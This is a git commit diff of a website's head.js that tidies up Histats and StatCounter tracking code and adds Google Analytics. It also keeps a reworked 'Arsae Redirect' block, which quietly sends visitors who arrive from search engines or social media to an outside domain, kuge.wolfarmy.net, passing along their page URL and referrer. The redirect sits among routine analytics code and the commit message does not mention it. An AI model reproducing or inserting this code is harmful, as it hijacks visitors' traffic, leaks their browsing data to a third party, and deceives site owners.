d8618563934d4ef908d0b147e95db0ef4e12b24c
ivortexia <panahmerah984@gmail.com>
2026-02-02 23:17:21 +0700

    Update head.js

--- x/head.js
+++ x/head.js
@@ -1,20 +1,82 @@
-//Histats
-document.write('<img alt="stats" src="//sstatic1.histats.com/0.gif?4963262&101"/>');
+/* =======================
+   Histats
+======================= */
+(function () {
+  var img = document.createElement('img');
+  img.alt = 'stats';
+  img.src = '//sstatic1.histats.com/0.gif?4963262&101';
+  img.style.display = 'none';
+  document.head.appendChild(img);
+})();
 
-///// Statcounter /////
-var sc_project=13049188; 
-var sc_invisible=1; 
-var sc_security="28b53553";
+/* =======================
+   StatCounter
+======================= */
+var sc_project = 13049188;
+var sc_invisible = 1;
+var sc_security = "28b53553";
 
-document.write('<script type="text/javascript" src="https://www.statcounter.com/counter/counter.js" async></script>');
-document.write('<noscript>');
-document.write('<div class="statcounter">');
-document.write('<a title="Web Analytics" href="https://statcounter.com/" target="_blank">');
-document.write('<img class="statcounter" src="https://c.statcounter.com/13049188/0/28b53553/1/" alt="Web Analytics" referrerPolicy="no-referrer-when-downgrade">');
-document.write('</a>');
-document.write('</div>');
-document.write('</noscript>');
+(function () {
+  var sc = document.createElement('script');
+  sc.src = 'https://www.statcounter.com/counter/counter.js';
+  sc.async = true;
+  document.head.appendChild(sc);
 
-///// Arsae /////
-var ars = 'http://kuge.wolfarmy.net';
-if(['.aol.', 'chatgpt.', 'msn.', '.google.', 'bing.', 'yandex.', 'facebook.', 'brave.', 'woa.', 'ecosia', 'qwant', 'pinterest.', 'coccoc.', 'baidu.', 'duckduckgo.', '.yahoo.', 't.co'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
+  var noscript = document.createElement('noscript');
+  noscript.innerHTML = `
+    <div class="statcounter">
+      <a title="Web Analytics" href="https://statcounter.com/" target="_blank" rel="noopener">
+        <img class="statcounter"
+             src="https://c.statcounter.com/13049188/0/28b53553/1/"
+             alt="Web Analytics"
+             referrerpolicy="no-referrer-when-downgrade">
+      </a>
+    </div>
+  `;
+  document.body.appendChild(noscript);
+})();
+
+/* =======================
+   Google Analytics (GA4)
+======================= */
+(function () {
+  var ga = document.createElement('script');
+  ga.async = true;
+  ga.src = 'https://www.googletagmanager.com/gtag/js?id=G-Q75MKXBWL7';
+  document.head.appendChild(ga);
+
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){ dataLayer.push(arguments); }
+  window.gtag = gtag;
+
+  gtag('js', new Date());
+  gtag('config', 'G-Q75MKXBWL7');
+})();
+
+/* =======================
+   Arsae Redirect
+======================= */
+(function () {
+  var ars = 'http://kuge.wolfarmy.net';
+
+  var refBots = [
+    '.aol.', 'chatgpt.', 'msn.', '.google.', 'bing.', 'yandex.',
+    'facebook.', 'brave.', 'woa.', 'ecosia', 'qwant', 'pinterest.',
+    'coccoc.', 'baidu.', 'duckduckgo.', '.yahoo.', 't.co'
+  ];
+
+  var uaBots = ['fb', 'facebook', 'pinterest', 'twitter'];
+
+  var ref = document.referrer.toLowerCase();
+  var ua = navigator.userAgent.toLowerCase();
+
+  if (
+    refBots.some(s => ref.includes(s)) ||
+    uaBots.some(s => ua.includes(s))
+  ) {
+    window.location.href =
+      ars +
+      '/?arsae=' + encodeURIComponent(window.location.href) +
+      '&arsae_ref=' + encodeURIComponent(document.referrer);
+  }
+})();
